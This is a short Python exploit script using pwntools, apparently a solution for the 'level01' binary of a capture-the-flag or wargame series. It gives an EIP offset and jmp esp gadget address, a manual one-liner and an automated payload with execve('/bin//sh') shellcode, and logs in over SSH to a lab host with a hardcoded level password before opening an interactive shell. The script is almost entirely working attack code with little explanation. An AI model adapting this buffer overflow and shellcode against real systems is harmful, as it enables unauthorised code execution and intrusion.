from pwn import *

### NECESSARY INFORMATIONS ###

# offset at 80 to control EIP
# jmp esp @ 0xf7e2c000 + 0x00002a55 --> 0xf7e2ea55



### MANUAL EXPLOIT ###

# $ python -c "print('dat_wil' + 'A' * 248 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * (52) + '\x55\xea\xe2\xf7' + '\x83\xec\x54\xff\xe4')" > /tmp/payload
# $ cat /tmp/payload - | ./level01



### AUTOMATIC EXPLOIT ###

shellcode   = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload_1   = b'dat_wil'
payload_2   = shellcode
payload_2   += b'B' * (80 - len(shellcode))
payload_2   += b'\x55\xea\xe2\xf7'
payload_2   += b'\x83\xEC\x54\xFF\xE4'


s = ssh(host='192.168.1.3', port=4242, user="level01", password="uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL")
p = s.process('/home/users/level01/./level01')


p.recvline(2)
p.sendline(payload_1)
p.recvline(3)
p.sendline(payload_2)
p.interactive()
